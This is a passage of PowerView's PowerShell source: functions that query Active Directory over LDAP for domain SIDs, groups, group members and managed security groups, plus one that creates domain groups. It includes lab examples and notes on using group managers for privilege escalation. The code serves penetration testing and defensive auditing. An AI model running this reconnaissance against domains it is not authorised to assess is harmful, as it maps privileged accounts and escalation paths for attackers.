                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    # have to do the filtering after the LDAP query as LDAP doesn't let you specify
                    #   wildcards for 'siteobject' :(
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {
<#
.SYNOPSIS

Returns the SID for the current domain or the specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer  

.DESCRIPTION

Returns the SID for the current domain or the specified domain by executing
Get-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)
to search for domain controllers through LDAP. The SID of the returned domain controller
is then extracted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSID

.EXAMPLE

Get-DomainSID -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSID -Credential $Cred

.OUTPUTS

String

A string representing the specified domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}


function Get-DomainGroup {
<#
.SYNOPSIS

Return all groups or specific group objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all group objects for
the current domain are returned. To return the groups a specific user/group is
a part of, use -MemberIdentity X to execute token groups enumeration.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER MemberIdentity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the user/group member to query for group membership.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER GroupScope

Specifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.
Also accepts NotDomainLocal, NotGloba, and NotUniversal as negations.

.PARAMETER GroupProperty

Specifies a specific property to search for when performing the group search.
Possible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGroup | select samaccountname

samaccountname
--------------
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
...

.EXAMPLE

Get-DomainGroup *admin* | select distinguishedname

distinguishedname
-----------------
CN=Administrators,CN=Builtin,DC=testlab,DC=local
CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local
CN=Schema Admins,CN=Users,DC=testlab,DC=local
CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
CN=Domain Admins,CN=Users,DC=testlab,DC=local
CN=DnsAdmins,CN=Users,DC=testlab,DC=local
CN=Server Admins,CN=Users,DC=testlab,DC=local
CN=Desktop Admins,CN=Users,DC=testlab,DC=local

.EXAMPLE

Get-DomainGroup -Properties samaccountname -Identity 'S-1-5-21-890171859-3433809279-3366196753-1117' | fl

samaccountname
--------------
Server Admins

.EXAMPLE

'CN=Desktop Admins,CN=Users,DC=testlab,DC=local' | Get-DomainGroup -Server primary.testlab.local -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local
VERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(|(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))

usncreated            : 13245
grouptype             : -2147483646
samaccounttype        : 268435456
samaccountname        : Desktop Admins
whenchanged           : 8/10/2016 12:30:30 AM
objectsid             : S-1-5-21-890171859-3433809279-3366196753-1118
objectclass           : {top, group}
cn                    : Desktop Admins
usnchanged            : 13255
dscorepropagationdata : 1/1/1601 12:00:00 AM
name                  : Desktop Admins
distinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
member                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
whencreated           : 8/10/2016 12:29:43 AM
instancetype          : 4
objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroup -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'DEV\Domain Admins' | Get-DomainGroup -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))

distinguishedname
-----------------
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.Group

Custom PSObject with translated group property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }

                $SearcherArguments['Identity'] = $MemberIdentity
                $SearcherArguments['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    # convert the user/group to a directory entry
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    # cause the cache to calculate the token groups for the user/group
                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        # convert the token group sid
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        # ignore the built in groups
                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
                            $SearcherArguments['Identity'] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $Filter += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $GroupScopeValue = $PSBoundParameters['GroupScope']
                    $Filter = Switch ($GroupScopeValue) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
                    $Filter = Switch ($GroupPropertyValue) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {
<#
.SYNOPSIS

Creates a new domain group (assuming appropriate permissions) and returns the group object.

TODO: implement all properties that New-ADGroup implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.GroupPrincipal with the specified
group properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the group to create.
Maximum of 256 characters. Mandatory.

.PARAMETER Name

Specifies the name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the group to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.'

Creates the 'TestGroup' group with the specified description.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.' -Credential $Cred

Creates the 'TestGroup' group with the specified description using the specified alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.GroupPrincipal
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        # set all the appropriate group parameters
        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $Description
        }

        Write-Verbose "[New-DomainGroup] Attempting to create group '$SamAccountName'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[New-DomainGroup] Group '$SamAccountName' successfully created"
            $Group
        }
        catch {
            Write-Warning "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
        }
    }
}


function Get-DomainManagedSecurityGroup {
<#
.SYNOPSIS

Returns all security groups in the current (or target) domain that have a manager set.

Author: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  

.DESCRIPTION

Authority to manipulate the group membership of AD security groups and distribution groups
can be delegated to non-administrators by setting the 'managedBy' attribute. This is typically
used to delegate management authority to distribution groups, but Windows supports security groups
being managed in the same way.

This function searches for AD groups which have a group manager set, and determines whether that
user can manipulate group membership. This could be a useful method of horizontal privilege
escalation, especially if the manager can manipulate the membership of a privileged group.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainManagedSecurityGroup | Export-PowerViewCSV -NoTypeInformation group-managers.csv

Store a list of all security groups with managers in group-managers.csv

.OUTPUTS

PowerView.ManagedSecurityGroup

A custom PSObject describing the managed security group.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        # go through the list of security groups on the domain and identify those who have a manager
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $SearcherArguments['Identity'] = $_.managedBy
            $Null = $SearcherArguments.Remove('LDAPFilter')

            # $SearcherArguments
            # retrieve the object that the managedBy DN refers to
            $GroupManager = Get-DomainObject @SearcherArguments
            # Write-Host "GroupManager: $GroupManager"
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName

            # determine whether the manager is a user or a group
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $ACLArguments = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

            # # TODO: correct!
            # # find the ACLs that relate to the ability to write to the group
            # $xacl = Get-DomainObjectAcl @ACLArguments -Verbose
            # # $ACLArguments
            # # double-check that the manager
            # if ($xacl.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -and $xacl.AceType -eq 'AccessAllowed' -and ($xacl.ObjectSid -eq $GroupManager.objectsid)) {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $True
            # }
            # else {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $False
            # }

            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {
<#
.SYNOPSIS

Return the members of a specific domain group.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for the specified
group matching the criteria. Each result is then rebound and the full user
or group object is returned.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Recurse

Switch. If the group member is a group, recursively try to query its members as well.

.PARAMETER RecurseUsingMatchingRule

Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.
Much faster than manual recursion, but doesn't reveal cross-domain groups,
and only returns user accounts (no nested group objects themselves).

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMember "Desktop Admins"

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

'Desktop Admins' | Get-DomainGroupMember -Recurse

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Testing Group
GroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
